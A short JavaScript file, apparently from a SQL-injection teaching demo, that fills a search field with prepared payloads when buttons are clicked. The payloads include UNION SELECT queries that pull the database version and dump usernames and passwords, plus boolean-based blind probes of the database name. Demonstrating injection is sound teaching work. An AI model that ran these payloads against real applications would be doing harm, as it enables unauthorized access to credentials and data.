window.onload = function() {
    const query = document.getElementById('query');
    
    const language = document.getElementById('language');
    language.onclick = () => {
        query.value = 'language';
    }

    const script = document.getElementById('script');
    script.onclick = () => {
        query.value = 'script';
    }
    
    const version = document.getElementById('version');
    version.onclick = () => {
        query.value = '" UNION SELECT 1, @@version FROM DUAL;-- ';
    }
    
    const users = document.getElementById('users');
    users.onclick = () => {
        query.value = '" UNION SELECT username, password FROM users;-- ';
    }
    
    const btrue = document.getElementById('btrue');
    btrue.onclick = () => {
        query.value = '" AND 1=1;-- ';
    }
    
    const bfalse = document.getElementById('bfalse');
    bfalse.onclick = () => {
        query.value = '" AND 1=2;-- ';
    }
    
    const dbname = document.getElementById('dbname');
    dbname.onclick = () => {
        query.value = '" AND LENGTH(database()) = 14;-- ';
    }
    
    const letters = document.getElementById('letters');
    letters.onclick = () => {
        query.value = '" AND SUBSTRING(database(), 1, 1) = "s";-- ';
    }
}
